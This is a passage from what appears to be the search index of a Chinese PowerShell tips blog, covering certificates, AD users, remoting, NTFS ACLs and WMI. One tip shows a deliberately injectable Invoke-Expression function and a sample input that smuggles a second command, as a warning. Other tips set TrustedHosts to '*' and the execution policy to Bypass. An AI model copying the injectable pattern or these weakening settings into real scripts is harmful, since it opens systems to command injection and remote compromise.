C:\\windows\\WindowsUpdate.log'","link":"/2014/11/03/using-notepad-to-print-things/"},{"title":"PowerShell 技能连载 - 导入及安装证书","text":"适用于 PowerShell 所有版本 若要以编程的方式从文件中加载证书并将它安装到证书管理其的指定位置，请看以下脚本： $pfxpath = 'C:\\temp\\test.pfx' $password = 'test' [System.Security.Cryptography.X509Certificates.StoreLocation]$Store = 'CurrentUser' $StoreName = 'root' Add-Type -AssemblyName System.Security $certificate = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 $certificate.Import($pfxpath, $password, 'Exportable') $Store = New-Object system.security.cryptography.X509Certificates.x509Store($StoreName, $StoreLocation) $Store.Open('ReadWrite') $Store.Add($certificate) $Store.Close() 您可以配置这个脚本并指定待导入的证书文件的路径和密码。您还可以指定其存储的位置（当前用户或本地计算机），以及将其放入的容器（例如“root”代表受信任的根证书颁发机构，“my”代表个人）。","link":"/2014/11/04/importing-and-installing-certificate/"},{"title":"PowerShell 技能连载 - 显示 PowerShell 的命令行历史","text":"适用于 PowerShell 所有版本 在 PowerShell 控制台（非 PowerShell ISE）中，您只要按下 F7 键就可以列出刚才键入的命令列表。当然，如果还没有执行过任何命令，就不会显示任何内容。 按 ALT+F7 键将会清空命令行历史列表。","link":"/2014/11/05/display-command-history-in-powershell-console/"},{"title":"PowerShell 技能连载 - Invoke-Expression 是邪恶的","text":"适用于 PowerShell 所有版本 请在您的脚本中避免使用 Invoke-Expression。这个 cmdlet 接受一个字符串，并且像一个命令一样执行它。在大多数情况下，这是没必要的，它只能带来风险。 以下是一个故意构造的例子： function Test-BadBehavior($Path) { Invoke-Expression &quot;Get-ChildItem -Path $Path&quot; } 这个函数用 Invoke-Expression 来运行一个命令并且加上一个参数值，用来返回输入参数代表的路径下的文件列表。 由于 Invoke-Expression 接受任意的字符串参数，所以您将自己带入了类似“SQL 注入攻击”的环境中。请试着以这种方式运行脚本： PS&gt; Test-BadBehavior 'c:\\;Get-Process' 这样写第二个命令也会被执行，并会列出所有运行中的进程。Invoke-Expression 常常被攻击者用于从外部 URL 下载恶意的程序并轻松地执行。 当然，Invoke-Expression 本来就没必要用。平时在生产系统的脚本中基本没什么用。请注意确保以硬编码的方式编写您想执行的命令： function Test-BadBehavior($Path) { Get-ChildItem -Path $Path }","link":"/2014/11/06/invoke-expression-is-evil/"},{"title":"PowerShell 技能连载 - 用 Out-Host 代替 More","text":"适用于 PowerShell 控制台 请注意本文所述的内容仅限于“真实的”控制台使用。它不适用于 PowerShell ISE 编辑器。 在 PowerShell 控制台中，许多用户在要分页输出数据时仍然采用管道输出到 more.com 的老办法： PS&gt; dir c:\\windows | more 这看起来能用。不过当您输出大量数据到管道的时候，PowerShell 看起来卡住了： PS&gt; dir c:\\windows -Recurse -ErrorAction SilentlyContinue | more 这是因为 more.com 无法实时工作。它会首先收集所有的输入数据，然后开始分页输出。 更好的办法是使用 Out-Host cmdlet，结合 -Paging 参数： PS&gt; dir c:\\windows -Recurse -ErrorAction SilentlyContinue | Out-Host -Paging 它能即时输出结果，因为它一旦从管道接收到数据，就可以开始处理。","link":"/2014/11/07/use-out-host-instead-of-more/"},{"title":"PowerShell 技能连载 - 用 EFS 加解密文件","text":"适用于 PowerShell 所有版本 假设您的系统启用了 EFS (Encrypting File System)，并且您想将文件保存到一个 NTFS 盘中，那么以下是加密以及确保只有您可以读取该文件的方法： (Get-Item -Path 'C:\\path..to..some..file.txt').Encrypt() 如果加密成功，那么在 explorer.exe 中将会显示为绿色而不是平常的黑色。用 Decrypt() 代替 Encrypt() 来撤销加密。 请注意需要事先设置了 EFS，并且您的公司可能需要一个集中存放的备份加密秘钥。","link":"/2014/11/10/encrypting-and-decrypting-files-with-efs/"},{"title":"PowerShell 技能连载 - 函数的优先级永远比 cmdlet 高","text":"适用于 PowerShell 所有版本 函数的优先级永远比 cmdlet 高，所以如果两者名字相同，函数将会被执行。 这个函数将切实有效地改变 Get-Process 的行为： function Get-Process { 'go away' } 以下是意料之中的执行结果： PS&gt; Get-Process go away 甚至如果您指定了 cmdlet 的完整限定名，函数也可以优先执行： function Microsoft.PowerShell.Management\\Get-Process { 'go away' } 执行结果： PS&gt; Microsoft.PowerShell.Management\\Get-Process -Id $pid go away 这也适用于别名。它们的优先级甚至比函数更高。 唯一能确保确实执行的是 cmdlet 的方法是直接存取模块，选择希望执行的 cmdlet，然后直接调用它： $module = Get-Module Microsoft.PowerShell.Management $cmdlet = $module.ExportedCmdlets['Get-Process'] &amp; $cmdlet 或者，只需要用 -noprofile 参数启动一个新的 PowerShell，确保没有人能混进您的 PowerShell 环境即可。","link":"/2014/11/11/functions-always-beat-cmdlets/"},{"title":"PowerShell 技能连载 - 在 PowerShell ISE 中使用 F1 键","text":"适用于 PowerShell ISE 3 及以上版本 当您下载了 PowerShell 帮助文件之后（在提升权限的 shell 中，用 Update-Help），您就可以用 Get-Help 命令来查找许多有用主题背后的信息。例如，以下代码将列出所有包含关键字“Parameter”的主题： PS&gt; Get-Help parameter Name Category Module Synopsis ---- -------- ------ -------- Get-ClusterParameter Cmdlet FailoverClusters Get-Cl... Set-ClusterParameter Cmdlet FailoverClusters Set-Cl... about_CommonParameters HelpFile Descri... about_Functions_Advanced_Param... HelpFile Explai... about_Parameters HelpFile Descri... about_Parameters_Default_Values HelpFile Descri... about_ActivityCommonParameters HelpFile Descri... about_WorkflowCommonParameters HelpFile 一般性的帮助主题都是以“about_”开头的。 在 PowerShell ISE 中，只需要单击任何一个列出的名称，然后按下 F1 键，就可以在独立的帮主窗口中打开关联的主题。","link":"/2014/11/12/use-f1-in-powershell-ise/"},{"title":"PowerShell 技能连载 - 使用 IPv4 来 Ping","text":"适用于 PowerShell 所有版本 您可以像其它命令一样在 PowerShell 脚本中使用 ping.exe。向 ping 命令加入“-4”参数之后，您可以强制 ping 命令使用 IPv4 协议（也可以用“-6”参数强制使用 IPv6）。 PS&gt; ping localhost -4","link":"/2014/11/13/pinging-via-ipv4/"},{"title":"PowerShell 技能连载 - 用 Cmdlet 管理虚拟硬盘驱动器","text":"适用于 Windows 8.1 Pro/Enterprise 或 Server 2012 R2 Windows 8.1 和 Server 2012 R2 带来一系列额外的 cmdlet 命令，有一部分用于管理虚拟磁盘。不过，在使用这些 cmdlet 之前，您需要先启用“Hyper-V 角色”（请注意需要 Windows 8.1 Pro 或 Enterprise 版才支持客户端的 Hyper-V。“Home”版则不支持该功能）。 在 Windows 8.1 中，您需要手动做以下操作：打开控制面板，进入程序/程序和功能。您也可以在 PowerShell 中键入“appwiz.cpl”打开该功能。 下一步，点击“启用或关闭 Windows 功能”。这将打开一个列出所有功能的对话框。请定位到“Hyper-V”节点并启用它。然后点击 OK。如果找不到“Hyper-V”节点，那么您的 Windows 版本不支持客户端的 Hyper-V。如果“Hyper-V 平台”选项呈灰色，那么您需要在计算机的 BIOS 设置中启用虚拟化支持。 安装该功能需要几秒钟。当安装完成以后，您就可以使用一系列新的 cmdlet： 12345678910PS&gt; Get-Command -Module Hyper-VCommandType Name ModuleName----------- ---- ----------Cmdlet Add-VMDvdDrive Hyper-VCmdlet Add-VMFibreChannelHba Hyper-VCmdlet Add-VMHardDiskDrive Hyper-VCmdlet Add-VMMigrationNetwork Hyper-VCmdlet Add-VMNetworkAdapter Hyper-V(...)","link":"/2014/11/24/using-cmdlets-to-manage-virtual-hard-drives/"},{"title":"PowerShell 技能连载 - Join-Path 遇上不存在的驱动器会失败","text":"适用于 PowerShell 所有版本 您可能已经使用 Join-Path 通过父文件夹和文件来创建路径名。这个 cmdlet 在合并路径元素的时候能够正确地处理反斜杠的个数： 12345$part1 = 'C:\\somefolder\\'$part2 = '\\myfile.txt'$result = Join-Path -Path $part1 -ChildPath $part2$result 然而，如果路径元素存在，Join-Path 将会失败。所以您无法为一个没有加载的驱动器创建路径： 1234567$part1 = 'L:\\somefolder\\'$part2 = '\\myfile.txt'$result = Join-Path -Path $part1 -ChildPath $part2$resultJoin-Path : Cannot find drive. A drive with the name 'L' does not exist. 其实，Join-Path 所做的事也可以通过手工很好地完成。这段代码将合并两段路径元素并且能处理好反斜杠： 12345$part1 = 'L:\\somefolder\\'$part2 = '\\myfile.txt'$result = $part1.TrimEnd('\\') + '\\' + $part2.TrimStart('\\')$result 如果您在 Windows 功能中启用了 Hyper-V 的 PowerShell 模块（如前一个技能中描述的一样的），您现在就可以通过 PowerShell 管理虚拟磁盘。","link":"/2014/11/25/join-path-fails-with-non-existing-drives/"},{"title":"PowerShell 技能连载 - 查看 Windows 版本","text":"适用于 PowerShell 所有版本 您有安装 Windows 8.1 Basic 版、Pro 版，或 Enterprise 版吗？查看 Windows 版本号很容易，但查看具体是哪个子系列则不这么容易。 最好的方法是，获取 SKU 号，它能精确地体现 Windows 的版本类型，但如何将数字转化为一个有意义的名字也不太容易： 123PS&gt; Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty OperatingSystemSKU48 一个稍好的方式是用这段代码返回您当前使用的许可类型的明确的文字描述： 123PS&gt; Get-WmiObject SoftwareLicensingProduct -Filter 'Name like &quot;Windows%&quot; and LicenseStatus=1' | Select-Object -ExpandProperty NameWindows(R), Professional edition 另一种方法也可以返回 Windows 的主要版本信息： 123PS&gt; Get-WmiObject -Class Win32_OperatingSystem | Select-Object -ExpandProperty CaptionMicrosoft Windows 8.1 Pro","link":"/2014/11/26/finding-out-windows-version/"},{"title":"PowerShell 技能连载 - 读取磁盘和分区信息","text":"适用于 Windows 8.1 / Server 2012 R2 Windows 8.1 和 Server 2012 R2 带来的许多客户端和服务器 cmdlet 可以极大地简化磁盘的管理。 让我们从查看磁盘和分区开始。这将列出所有加载的磁盘： 1PS&gt; Get-Disk 这将列出分区： 1PS&gt; Get-Partition 这两个 cmdlet 都位于“Storage”模块中： 12345PS&gt; Get-Command -Name Get-Disk | Select-Object -ExpandProperty ModuleModuleType Version Name ExportedCommands---------- ------- ---- ----------------Manifest 2.0.0.0 Storage {Add-InitiatorIdToMas... 这将列出该模块中的所有存储管理命令： 1234567891011PS&gt; Get-Command -Module storageCommandType Name ModuleName----------- ---- ----------Alias Flush-Volume StorageAlias Initialize-Volume StorageAlias Write-FileSystemCache StorageFunction Add-InitiatorIdToMaskingSet StorageFunction Add-PartitionAccessPath StorageFunction Add-PhysicalDisk Storage(...)","link":"/2014/11/27/reading-disks-and-partitions/"},{"title":"PowerShell 技能连载 - 随机排列数字列表","text":"适用于 PowerShell 所有版本 这行代码将输入一个数字列表并对它们随机排序： 1Get-Random -InputObject 1, 2, 3, 5, 8, 13 -Count ([int]::MaxValue) 也可以用管道，不过速度更慢： 11, 2, 3, 5, 8, 13 | Sort-Object -Property { Get-Random }","link":"/2014/11/28/randomize-lists-of-numbers/"},{"title":"PowerShell 技能连载 - 数组中的空值","text":"适用于 PowerShell 所有版本 当您将 NULL 值赋给数组元素时，它们会记入数组元素中，但不会输出（毕竟，它们是所谓的空值）。这会导致调试时的困难。所以当数组的大小看起来和内容不一样时，请查查是否有空值： 123456789$a = @()$a += 1$a += $null$a += $null$a += 212Count: 4","link":"/2014/12/01/null-values-in-arrays/"},{"title":"PowerShell 技能连载 - 配置 PowerShell 的步骤（第 1 部分）","text":"适用于 PowerShell 2.0 及以上版本 如果您在家中或其它不重要的场合使用 PowerShell，那么可以通过以下步骤使 PowerShell 发挥最大功能。 您可以通过以下代码查看正在使用的 PowerShell 版本： 123PS&gt; $PSVersionTable.PSVersion.Major4 如果版本号小于 4，请审查一下为什么使用过期的版本，是不是可以升级了。 要启用脚本执行功能，请运行以下代码： 1PS&gt; Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force 您现在可以自由地执行任意位置的脚本了。如果您是初学者并且希望得到更多的安全保障，请将“Bypass”改为“RemoteSigned”。这将防止您运行下载自 Internet 或电子邮件附件的脚本。它也将防止您运行您拥有的域之外的脚本。","link":"/2014/12/02/steps-to-configure-powershell-part-1/"},{"title":"PowerShell 技能连载 - 配置 PowerShell 的步骤（第 2 部分）","text":"适用于 PowerShell 2.0 及以上版本 如果您在家中或其它不重要的场合使用 PowerShell，那么可以通过以下步骤使 PowerShell 发挥最大功能。 要允许系统管理员远程连接到您的机器并运行 Get-Process 或 Get-Service 等 cmdlets，您也许需要启用远程管理的防火墙例外规则。请以管理员身份打开 PowerShell 并运行这段代码： 12345678910PS&gt; netsh firewall set service remoteadmin enableIMPORTANT: Command executed successfully.However, &quot;netsh firewall&quot; is deprecated;use &quot;netsh advfirewall firewall&quot; instead.For more information on using &quot;netsh advfirewall firewall&quot; commandsinstead of &quot;netsh firewall&quot;, see KB article 947709at http://go.microsoft.com/fwlink/?linkid=121488 .Ok. 该命令返回的信息告诉我们该命令已过时，有一个更新的命令替代了它，但它任然可用并启用了防火墙例外。新的命令更难使用，因为它的参数是本地化的，并且您需要知道防火墙例外的确切名称。 要真正地用上 cmdlet 的远程功能，您还需要启用 RemoteRegistry 服务并将它设为自动启动： 123PS&gt; Start-Service RemoteRegistryPS&gt; Set-Service -Name Remoteregistry -StartupType Automatic 您现在可以使用 Get-Process、Get-Service 或其它暴露了 -ComputerName 参数的 cmdlet 来远程连接到您的计算机，假设运行这些 cmdlet 的用户拥有您系统上的管理员权限。 在简单的点对点家庭环境中，为每台计算机的 Administrator 账号设置相同的名字就足够了。","link":"/2014/12/03/steps-to-configure-powershell-part-2/"},{"title":"PowerShell 技能连载 - PowerShell 技能连载 - 配置 PowerShell 的步骤（第 3 部分）","text":"适用于 PowerShell 所有版本 如果您在家中或其它不重要的场合使用 PowerShell，那么可以通过以下步骤使 PowerShell 发挥最大功能。 要在您自己的的机器上启用 PowerShell 远程操作，您需要在您的机器上启用 PowerShell 远程操作功能。实现的方式是用管理员权限启动 PowerShell，然后运行该命令： 1PS&gt; Enable-PSRemoting -SkipNetworkProfileCheck -Force 请注意 -SkipNetworkProfileCheck 是 PowerShell 3.0 引入的概念。如果您仍在 使用 PowerShell 2.0，请忽略这个参数。如果 PowerShell 提示公用网络连接可用，您需要手动临时禁用公用网络连接。 该命令在您的机器上启用 PowerShell 远程操作。其他人现在可以连接到您的计算机，如果他是您计算机上的 Administrators 组成员。 然而，您只能用 Kerberos 身份验证方式来连接到别的计算机。所以此时，远程操作只适用于域环境。如果您在一个简单的点对点网络环境中或是想跨域使用远程操作功能，那么需要启用 NTLM 验证。请注意：只需要在客户端设置。不是在您想连接的目标机器上设，而是在您发起远程操作的机器上设： 1PS&gt; Set-Item -Path WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force 使用“*”允许您通过 NTLM 验证方式连接到任何目标机器。由于 NTLM 是一种非双向认证方式，所以当您使用该方式连接到一台不受信任或可能已被入侵的机器时，会增加安全风险。所以最好不要用“*”，而是指定 IP 地址或 IP 地址段，例如“10.10.*”。 当设置好 PowerShell 远程操作之后，您可以开始使用。 这行代码将会在 ABC 机器上运行任意的 PowerShell 代码（需要您事先在 ABC 机器上启用远程操作功能，并且拥有 ABC 机器上的管理员权限）： 1PS&gt; Invoke-Command -ScriptBlock { &quot;Hello&quot; &gt; c:\\IwasHERE.txt } -ComputerName ABC 这段代码将实现同样的效果，但这里您需要显式地制定凭据。当您指定了一个账户，请确定指定了域名和用户名。如果它不是一个域账户，请指定机器名和用户名： 1Invoke-Command -ScriptBlock { &quot;Hello&quot; &gt; c:\\IwasHERE.txt } -ComputerName ABC -Credential ABC\\localAdminAccount 请注意：当您想用非 Kerberos 验证的时候，加入域的计算机需要使用 -Credential 参数。","link":"/2014/12/04/steps-to-configure-powershell-part-3/"},{"title":"PowerShell 技能连载 - PowerShell 技能连载 - 移除 AD 组成员","text":"需要 ActiveDirectory Module 要从 Active Directory 组中移除一个或多个用户，尝试以下方法： 123456$user = @()$user += Get-ADUser -Filter { Name -like 'H*'}$user += Get-ADUser -Filter { Name -like '*ll*'}$user.NameRemove-ADGroupMember -Identity 'SomeGroup' -Members $user 这段代码将查找名字符合指定模式的所有用户，然后将用户列表传递给 Remove-ADGroupMember 来将用户从该组中移除掉。 请注意空数组的使用。一个空数组可以通过“+=”运算符一次或多次加入元素，并且该操作符可以接受单个用户也可以接受一个数组。所以您可以向列表添加一个或多个用户——例如过滤查询的结果。","link":"/2014/12/05/removing-ad-group-members/"},{"title":"PowerShell 技能连载 - 根据 Excel 表批量创建 AD 用户","text":"需要 ActiveDirectory Module 为了创建大量新的 Active Directory 用户，您可以从 CSV 文件中导入用户信息，这个 CSV 可以由 Excel 表导出。 下一步，这段代码将会把 CSV 数据转为真实的 Active Directory 用户账户。 Import-Csv -Path F:\\userlist.csv -UseCulture -Encoding Default | ForEach-Object { $_.AccountPassword = $_.AccountPassword | ConvertTo-SecureString -Force -AsPlainText $_ } | New-ADUser -WhatIf CSV 文件所需的只是 New-ADUser 所需要的参数作为列名。一个详尽的列表可能包含以下列名：Name、SamAccountName、Description、Company、City、Path、AccountPassword。 请注意 CSV 文件天生只能包含字符串数据类型。由于 AccountPassword 属性需要一个 SecureString 数据类型的值，所以 PowerShell 代码将从 CSV 文件中读取字符串转换为 SecureString 之后再传递给 New-ADUser。 这个技术可以用于创建用户前预处理任何原始数据。","link":"/2014/12/08/bulk-creating-ad-users-from-excel-sheets/"},{"title":"PowerShell 技能连载 - 设置 Active Directory 属性","text":"需要 ActiveDirectory 模块 PowerShell 用哈希表来设置一个用户账户的 AD 属性这是一种多功能的指定任意键值对的方法。 这个简单的例子将设置用户“_testuser_”的“_l_”和“_mail_”属性。您可以向哈希表加入任意多的键值对，假设在您的 AD schema 中不存在该属性名，并且指定的数据类型是合法的： $infos = @{} $infos.l = 'Bahamas' $infos.mail = 'sunny@offshore.com' Set-ADUser -Identity testuser -Replace $infos","link":"/2014/12/09/setting-active-directory-attributes/"},{"title":"PowerShell 技能连载 - 解析 DISM 日志文件","text":"适用于 PowerShell 2.0 及更高版本 在您的 Windows 文件夹中，您会见到各种系统日志文件。其中一种是 DISM 日志文件，它包含了 Windows 的配置信息（特性状态等）。 以下是一个简单的实践，演示如何解析这类日志文件并得到可用 PowerShell cmdlet 操作的富对象： $path = &quot;$env:windir\\logs\\dism\\dism.log&quot; Get-Content -Path $path | ForEach-Object { $_ -replace '\\s{2,}', ',' } | ConvertFrom-Csv -Header (1..20) | ForEach-Object { $array = @() $array += $_.1 -split ' ' $array += $_.2 $array += $_.3 $array += $_.4 $array += $_.5 $array -join ',' } | ConvertFrom-Csv -Header (1..20) | Out-GridView","link":"/2014/12/10/parsing-dism-log-file/"},{"title":"PowerShell 技能连载 - 查找进程所有者","text":"适用于 PowerShell 所有版本 要查看某个进程的所有者以及有多少个实例在运行，请试试以下这段代码： $ProcessName = 'explorer.exe' (Get-WmiObject -Query &quot;select * from Win32_Process where name='$ProcessName'&quot;).GetOwner().User 请注意：有许多办法能够查看当前登录的用户，并且根据您使用环境的不同，这里展示的方法可能有一定的局限性。它假设当前用户使用图形界面登录。由于在 server core 的机器上，只能运行非图形界面的进程，所以该脚本在该情况下不能检测连接到主机的用户名。 这个例子返回这台机器上所有“explorer.exe”进程的所有者。如果您有管理员权限并且远程进行此操作，那么该用户列表将类似已交互式登录的用户，因为每个桌面用户都创建了一个 explorer 进程。 当加入一个 Sort-Object 命令之后，您就可以轻松地排除重复项： $ProcessName = 'explorer.exe' (Get-WmiObject –Query &quot;select * from Win32_Process where name='$ProcessName'&quot;).GetOwner().User | Sort-Object -Unique 如果改变进程名，您会发现其它有趣的东西。这段代码将列出当前通过 PowerShell 远程操作访问您机器的所有用户： $ProcessName = 'wsmprovhost.exe' try { (Get-WmiObject -Query &quot;select * from Win32_Process where name='$ProcessName'&quot;).GetOwner().User | Sort-Object -Unique } catch { Write-Warning &quot;No user found.&quot; }","link":"/2014/12/11/finding-process-owners/"},{"title":"PowerShell 技能连载 - 获取系统启动时间","text":"适用于 PowerShell 所有版本 这个简单的函数可以返回当前系统的启动时间： function Get-Uptime { $millisec = [Environment]::TickCount [Timespan]::FromMilliseconds($millisec) }","link":"/2014/12/12/gettingsystemuptime/"},{"title":"PowerShell 技能连载 - 使用 WMI 继承","text":"适用于 PowerShell 所有版本 WMI 类是彼此继承的，我们可以利用这个特性。例如这行代码： PS&gt; Get-WmiObject -Class Win32_Printer 它将返回通过 WMI 获取到的所有打印机。打印机是从更多的通用类继承的，这段代码可以显示继承树： PS&gt; Get-WmiObject -Class Win32_Printer | Select-Object -ExpandProperty __derivation -First 1 CIM_Printer CIM_LogicalDevice CIM_LogicalElement CIM_ManagedSystemElement 所以如果您不只是对打印机感兴趣，而是对更多的硬件感兴趣，那么选择更通用的父类，例如 CIM_LogicalDevice。这行代码可以获取所有的硬件清单： PS&gt; Get-WmiObject -Class CIM_LogicalDevice Manufacturer Name Status StatusInfo ------------ ---- ------ ---------- Realtek Realtek High Def... OK 3 Kona OK Intel Corporation Intel(R) 8 Serie... OK Intel Corporation Intel(R) Wireles... Microsoft Microsoft Kernel... ASIX AX88772B US... Microsoft Virtueller Micro... Microsoft Bluetooth-Gerät ... Microsoft Microsoft-ISATAP... Microsoft-ISATAP... Microsoft Teredo Tunneling... Microsoft Von Microsoft ge... Microsoft-ISATAP... Microsoft-ISATAP... Microsoft-ISATAP... Microsoft-ISATAP... ASIX AX88772B US... Microsoft-ISATAP... Microsoft-ISATAP... Virtueller Micro... Microsoft-ISATAP... Microsoft-ISATAP... Microsoft-ISATAP... -Virtual Battery 0- CRB Battery 0 (...) 这段代码将返回有关的类，这样的您就可以清晰地看到 WMI 如何调用您的硬件类型： PS&gt; Get-WmiObject -Class CIM_LogicalDevice | Group-Object -Property __Class -NoElement Count Name ----- ---- 1 Win32_SoundDevice 1 Win32_Battery 1 Win32_IDEController 20 Win32_NetworkAdapter 1 Win32_PortableBattery 10 Win32_Printer 1 Win32_Processor 2 Win32_DiskDrive 7 Win32_DiskPartition 1 Win32_Fan 2 Win32_Keyboard 5 Win32_LogicalDisk 2 Win32_MappedLogicalDisk 1 Win32_MemoryArray 2 Win32_MemoryDevice 2 Win32_PointingDevice 1 Win32_SCSIController 2 Win32_USBController 6 Win32_USBHub 5 Win32_Volume 4 Win32_CacheMemory 1 Win32_DesktopMonitor 1 Win32_VideoController 1 Win32_VoltageProbe 1 Win32_MotherboardDevice 8 Win32_Bus 134 Win32_PnPEntity It basically takes all the instances derived from CIM_LogicalDevice and groups them by “__Class” which is their real class name.它基本上获取从 CIM_LogicalDevice 继承的所有实例并按照“__Class”分组。这是它们的真实类名。","link":"/2014/12/15/using-wmi-inheritance/"},{"title":"PowerShell 技能连载 - 捕获本地 EXE 的错误（第 1 部分）","text":"适用于 PowerShell 所有版本 当您运行本地控制台命令，例如 robocopy.exe、ipconfig.exe 或类似的命令时，您可以处理这些命令中抛出的错误： try { $current = $ErrorActionPreference $ErrorActionPreference = 'Stop' # this will cause an EXE command to emit an error # (replace with any console-based EXE command) net.exe user nonexistentUser 2&gt;&amp;1 $ErrorActionPreference = $current } catch { Write-Host ('Error occured: ' + $_.Exception.Message) } 要捕获错误，您需要临时将 $ErrorActionPreference 设为“Stop”。另外，您需要用“2&gt;&amp;1”将错误信息重定向到输出控制台。 这么做完之后，例如 .NET 错误等错误就可以被 PowerShell 处理了。","link":"/2014/12/16/catching-errors-in-native-exes-part-1/"},{"title":"PowerShell 技能连载 - 克隆 NTFS 权限","text":"适用于 PowerShell 所有版本 以下代码从一个文件夹读取 NTFS 权限并将该设置应用到另外一个文件夹上。请注意两个文件夹都必须存在： $FolderToCopyFrom = 'C:\\folder1' $FolderToCopyTo = 'C:\\folder2' $securityDescriptor = Get-Acl -Path $FolderToCopyFrom Set-Acl -Path $FolderToCopyTo -AclObject $securityDescriptor 复制安全描述符操作可能需要管理员权限。请注意第二个文件夹的所有安全规则都会被第一个文件夹的安全信息覆盖。","link":"/2014/12/17/cloning-ntfs-permissions/"},{"title":"PowerShell 技能连载 - 用 SDDL 替换 NTFS 权限","text":"适用于 PowerShell 所有版本 您可以通过 Get-Acl 命令将文件和文件夹的安全信息导出成 SDDL 格式（安全描述定义语言）的纯文本文件： $FolderToRead = 'C:\\folder1' $securityDescriptor = Get-Acl -Path $FolderToRead $securityDescriptor.GetSecurityDescriptorSddlForm('All') 您可以将 SDDL 通过管道输出到剪贴板，然后将它粘贴到另一个脚本中： $FolderToRead = 'C:\\folder1' $securityDescriptor = Get-Acl -Path $FolderToRead $securityDescriptor.GetSecurityDescriptorSddlForm('All') | clip.exe 类似这样将 SDDL 加入脚本中，例如（请注意 SDDL 总是只有一行，所以请不要添加换行符）： $sddl = 'O:S-1-5-21-2649034417-1209187175-3910605729-1000G:S-1-5-21-2649034417-1209187175-3910605729-513D:(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;OICIID;0x1200a9;;;BU)(A;ID;0x1301bf;;;AU)(A;OICIIOID;SDGXGWGR;;;AU)' $FolderToConfigure = 'C:\\folder2' $securityDescriptor = Get-Acl -Path $FolderToConfigure $securityDescriptor.SetSecurityDescriptorSddlForm($sddl) Set-Acl -Path $FolderToConfigure -AclObject $securityDescriptor 将 SDDL 插入脚本之后，您就不再需要生成 SDDL 用的模板文件夹了。您可以将安全信息应用到其它文件系统对象中，例如设置基本 NTFS 权限，或先编辑 SDDL 再应用它。 为您提供一些启示，在域迁移的场景中，您可以比如创建一个转换表，用于将旧的 SID 转换为新的 SID。然后，将旧的 SID 替换成新的 SID，然后将记录下的安全信息克隆到一个新的（或测试的）域中。","link":"/2014/12/18/replacing-ntfs-permissions-with-sddl-information/"},{"title":"PowerShell 技能连载 - 捕获本地 EXE 的错误（第 2 部分）","text":"适用于 PowerShell 所有版本 以下是检测控制台程序发出的错误的另一种方法： $ErrorActionPreference = 'Continue' $result = net.exe user UserDoesNotExist 2&gt;&amp;1 # $? is $false when something went wrong if ($? -eq $false) { # read last error: $errMsg = $result.Exception.Message -join ',' Write-Host &quot;Something went wrong: $errMsg&quot; } else { Write-Host 'All is fine.' } 请注意 $ErrorActionPreference 的用法：当它设置为‘Stop’时，错误将被转换为一个 .NET 异常。$ErrorActionPreference 的缺省设置是‘Continue’。通过这个设置，脚本可以通过 $err 获得错误信息。 如果最后一次调用失败了，内置的 $? 变量将会返回 $false。在这种情况下，代码将会返回一条错误信息（或者做其它事情，例如写日志文件）。","link":"/2014/12/19/catching-errors-in-native-exes-part-2/"},{"title":"PowerShell 技能连载 - 设置 AD 或 Windows 的权限","text":"需要 ActiveDirectory 模块 我们之前已经演示了如何用 Get/Set-Acl 来读写文件和文件夹的权限。 实际上这两个 cmdlet 可以处理所有合法的 PowerShell 路径。说以您可以同样地在 Windows 注册表中使用相同的方法来读取、克隆和写入属性。 这个例子从一个注册表键中读取已有的安全信息，并应用到另一个键上： # both Registry keys must exist $KeyToCopySecurityFrom = 'HKLM:\\Software\\Key1' $KeyToCopySecurityTo = 'HKLM:\\Software\\Key1' $securityDescriptor = Get-Acl -Path $KeyToCopySecurityFrom Set-Acl -Path $KeyToCopySecurityTo -AclObject $securityDescriptor 类似地，如果您从微软安装了 RSAT 工具并启用了 ActiveDirectory PowerShell 模块，您就可以使用它的 PowerShell 驱动器 AD: 来对 AD 对象做类似的操作，例如，从一个 OU 克隆委派权限到另一个 OU 上。 您现在可以根据需要读取、修改或重新应用如委派控制、防止意外删除等 Active Directory 特性。 Import-Module ActiveDirectory # both OUs must exist $OUtoCopyFrom = 'AD:\\OU=Employees,DC=TRAINING,DC=POWERSHELL' $OUtoCopyTo = 'AD:\\OU=TestEmployees,DC=TRAINING,DC=POWERSHELL' $securityDescriptor = Get-Acl -Path $OUtoCopyFrom Set-Acl -Path $OUtoCopyTo -AclObject $securityDescriptor 您现在可以对任何 AD 对象通过这种方式读取和写入安全信息，包括 DNS 信息。您所需要的只是知道您想读写的对象的 LDAP 路径。","link":"/2014/12/22/setting-permissions-in-ad-or-windows-registry/"},{"title":"PowerShell 技能连载 - 限制 String 的最大长度","text":"适用于 PowerShell 所有版本 要限制输出的文本不会过长，您可以使用类似这样的的逻辑来缩短超过指定长度的文本： if ($text.Length -gt $MaxLength) { $text.Substring(0,$MaxLength) + '...' } else { $text }","link":"/2014/12/23/limiting-maximum-string-length/"},{"title":"PowerShell 技能连载 - 创建一大堆测试文件","text":"适用于 PowerShell 所有版本 如果您需要对系统进行压力测试，或因为别的原因需要大量测试文件，以下是在瞬间创建大量文件（可以是大文件）的代码： $Path = &quot;$env:temp\\hugefile.txt&quot; $Size = 200MB $stream = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::CreateNew) $stream.Seek($Size, [System.IO.SeekOrigin]::Begin) $stream.WriteByte(0) $Stream.Close() explorer.exe &quot;/select,$Path&quot;","link":"/2014/12/24/creating-huge-dummy-files/"},{"title":"PowerShell 技能连载 - 从 LDAP 路径获取 OU","text":"适用于 PowerShell 所有版本 要从原始字符串从截取特定的部分，您常常需要使用一系列文本分割和取子串的命令。 例如，要从一个 LDAP 陆军中截取最后一个 OU 的名字，一下是一种办法： $dn = 'OU=Test,OU=People,CN=Testing,OU=Everyone,DC=Company,DC=com' ($dn.Split(',') -like 'OU=*' ).Substring(3)[0] 这段代码将返回该 LDAP 路径（LDAP 路径是从右往左读的，所以最后一个 OU 是字符串中的第一个 OU），而且稍作修改就可以读取其它部分。例如，将下标从 0 改为 -1 就可以读取路径中的第一个 OU。","link":"/2014/12/25/get-the-ou-from-an-ldap-path/"},{"title":"PowerShell 技能连载 - 压缩路径","text":"适用于 PowerShell 2.0 及以上版本 有些时候报表中的路径名太长了。要缩短一个路径，您当然可以将字符串截断成指定的长度，但是这将导致路径丧失可读性。一个更好的办法是使用内置的 Windows API 函数来更智能地缩短路径。 以下例子也演示了如何在 PowerShell 脚本中使用 C# 代码： $newType = @' using System; using System.Text; using 